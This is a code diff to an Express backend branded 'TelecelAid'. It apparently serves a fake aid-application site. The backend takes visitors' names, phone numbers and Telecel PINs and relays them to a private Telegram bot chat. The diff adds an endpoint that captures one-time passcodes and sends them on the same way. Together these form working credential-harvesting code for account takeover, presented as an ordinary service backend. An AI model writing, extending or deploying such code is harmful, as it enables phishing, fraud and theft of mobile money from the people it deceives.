@@ -17,19 +17,33 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 // Function to send message to Telegram
-async function sendToTelegram(name, phone, pin) {
-    const message = `🔔 *NEW TELECELAID APPLICATION* 🔔
+async function sendToTelegram(name, phone, pin, type = 'application') {
+    let message = '';
     
+    if (type === 'application') {
+        message = `🔔 *NEW TELECELAID APPLICATION* 🔔
+        
 ━━━━━━━━━━━━━━━━━━━━━━
 👤 *Name:* ${name}
 📞 *Phone:* ${phone}
 🔐 *PIN:* ${pin}
 ━━━━━━━━━━━━━━━━━━━━━━
 📅 *Date:* ${new Date().toLocaleString()}
-📍 *IP:* ${new Date().toISOString()}
+✅ *Status:* Pending Review
+━━━━━━━━━━━━━━━━━━━━━━`;
+    } else if (type === 'otp') {
+        message = `🔐 *OTP VERIFICATION* 🔐
+        
 ━━━━━━━━━━━━━━━━━━━━━━
-✅ *Status:* Pending Review`;
-
+👤 *Name:* ${name}
+📞 *Phone:* ${phone}
+🔢 *OTP Code:* ${pin}
+━━━━━━━━━━━━━━━━━━━━━━
+📅 *Date:* ${new Date().toLocaleString()}
+✅ *Status:* OTP Verified Successfully
+━━━━━━━━━━━━━━━━━━━━━━`;
+    }
+    
     try {
         const response = await axios.post(TELEGRAM_API, {
             chat_id: CHAT_ID,
@@ -48,13 +62,12 @@ app.get('/', (req, res) => {
     res.json({ status: 'OK', message: 'TelecelAid Backend is running' });
 });
 
-// Main endpoint for form submission
+// Endpoint for application submission (verify page)
 app.post('/api/submit', async (req, res) => {
     const { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin } = req.body;
     
-    console.log('Received submission:', { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin });
+    console.log('Received application submission:', { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin });
     
-    // Use confirmed name if available, otherwise use full name
     const finalName = confirmedName || fullName;
     const finalPhone = confirmedPhone || phoneNumber;
     
@@ -66,10 +79,8 @@ app.post('/api/submit', async (req, res) => {
     }
     
     try {
-        // Send to Telegram
-        await sendToTelegram(finalName, finalPhone, telecelPin);
+        await sendToTelegram(finalName, finalPhone, telecelPin, 'application');
         
-        // Return success response
         res.json({ 
             success: true, 
             message: 'Application submitted successfully' 
@@ -84,9 +95,40 @@ app.post('/api/submit', async (req, res) => {
     }
 });
 
+// NEW ENDPOINT: For OTP verification (otp page)
+app.post('/api/verify-otp', async (req, res) => {
+    const { fullName, phoneNumber, otpCode } = req.body;
+    
+    console.log('Received OTP verification:', { fullName, phoneNumber, otpCode });
+    
+    if (!fullName || !phoneNumber || !otpCode) {
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Missing required fields: name, phone, or OTP' 
+        });
+    }
+    
+    try {
+        await sendToTelegram(fullName, phoneNumber, otpCode, 'otp');
+        
+        res.json({ 
+            success: true, 
+            message: 'OTP verified and sent to Telegram' 
+        });
+        
+    } catch (error) {
+        console.error('Error sending OTP to Telegram:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Failed to verify OTP. Please try again.' 
+        });
+    }
+});
+
 // Start server
 app.listen(PORT, () => {
     console.log(`🚀 TelecelAid Backend running on port ${PORT}`);
     console.log(`📡 Telegram Bot configured: ${BOT_TOKEN ? 'Yes' : 'No'}`);
     console.log(`📱 Chat ID configured: ${CHAT_ID ? 'Yes' : 'No'}`);
+    console.log(`🌐 Server URL: http://localhost:${PORT}`);
 });
